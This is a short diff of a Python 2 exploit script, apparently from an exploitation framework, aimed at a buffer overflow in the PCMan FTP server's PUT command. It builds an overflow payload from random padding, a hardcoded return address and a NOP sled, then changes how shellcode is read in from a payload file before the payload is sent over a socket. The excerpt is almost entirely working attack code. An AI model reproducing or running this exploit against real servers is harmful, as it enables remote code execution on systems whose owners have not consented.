@@ -80,7 +80,9 @@ class pcmanPutOverflowMenu(cmd.Cmd):
       payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
     payload += "\x77\xc3\x54\x59"
     payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-    exec(open("../../../payloads/pcman_put.shell", "r").read())
+    f = open("../../../payloads/pcman_put.shell", "r")
+    for line in f.readlines():
+      payload += line[:-1].decode('string_escape')
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
     s = socket(AF_INET, SOCK_STREAM)
